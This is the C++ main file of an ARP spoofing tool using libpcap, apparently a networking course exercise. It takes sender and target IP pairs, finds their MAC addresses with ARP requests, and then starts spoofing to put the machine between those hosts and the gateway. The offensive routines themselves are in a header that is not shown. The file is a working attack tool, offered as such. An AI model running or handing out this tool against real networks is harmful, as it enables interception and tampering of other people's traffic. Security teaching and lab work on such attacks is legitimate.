#include <pcap.h>
#include <netinet/in.h>
#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <map>
#include "arp_spoof.h"


using namespace std;

int main(int argc, char* argv[]){
	uint32_t myip = 0;
	uint8_t gatewayip[10];
	uint8_t mymac[10];
	uint8_t send_ip[10];
	uint8_t target_ip[10];
	char gateway[20];

	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];

	uint32_t sender_target[100][100];  // [0][] : sender [1][] : target
	uint8_t mac_addr[100][10];
	uint8_t ip_table[100][20];
	int num_session = 0;
	map<uint32_t, uint8_t*> iptomac;

	if(argc < 6){
		printf("more argumnets");
		return -1;
	}

	for(int i = 0; i < argc -2; ++i){
		sscanf(argv[2+i], "%u.%u.%u.%u",ip_table[i],ip_table[i]+1,ip_table[i]+2,ip_table[i]+3);
	}
	
	
	get_myIpaddr(&myip, argv[1]);
	
	get_myMacaddr(mymac, argv[1]);
	
	get_gatewayip(gateway, 20);

	printf("%s\n",gateway);
	sscanf(gateway,"%u.%u.%u.%u", gatewayip, gatewayip + 1, gatewayip + 2, gatewayip + 3);	
	
	printf("\nGateWay IP ADDRESS : ");
	print_len(gatewayip,4);
	printf("\nMy IP ADDRESS : ");
	print_len((uint8_t*)&myip, 4);
	printf("\nMy MAC ADDRESS : ");
	print_len(mymac,6);

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

	if(handle == NULL){
		fprintf(stderr, "couldn't open device %s: %s\n",argv[1],errbuf);
		return -1;
	}

//get mac address from ip 
	for(int i = 0 ; i < argc - 2 ; i += 2){
		sender_target[0][num_session] = *((uint32_t*)ip_table[i]);
		sender_target[1][num_session++] = *((uint32_t*)ip_table[i+1]);
		printf("\n-----------%d . session --------------------\n",num_session);
		printf("send_ip : ");
		print_len(ip_table[i],4);
		printf("\ntarget_ip : ");
		print_len(ip_table[i+1],4);
		cout << endl;
		if(iptomac.find(*((uint32_t*)ip_table[i])) == iptomac.end()){
			arp_send_pkt_req(mac_addr[i], ip_table[i], mymac, (uint8_t*)&myip, handle);
			iptomac[*((uint32_t*)ip_table[i])] = mac_addr[i];
		}
		if(iptomac.find(*((uint32_t*)ip_table[i+1])) == iptomac.end()){
			
			arp_send_pkt_req(mac_addr[i+1], ip_table[i+1], mymac, (uint8_t*)&myip, handle);
			iptomac[*((uint32_t*)ip_table[i+1])] = mac_addr[i+1];
		}
		
	}
	cout << endl;
	cout << "-------------ip - mac table-------------------" << endl;
	for(map<uint32_t, uint8_t*>::iterator it = iptomac.begin(); it != iptomac.end(); ++it){
		printf("%x",ntohl(it->first));
		cout << " : ";
		print_len(it->second, 6);
		cout << endl;
	}
		
		

	//arp spoofing
	printf("arp spoofing start\n");
	arp_spoof_on(num_session, *((uint32_t*)gatewayip), sender_target, iptomac , mymac, (uint8_t*)&myip, handle); 
	printf("arp spoofing end");
	pcap_close(handle);
	return 1;
}
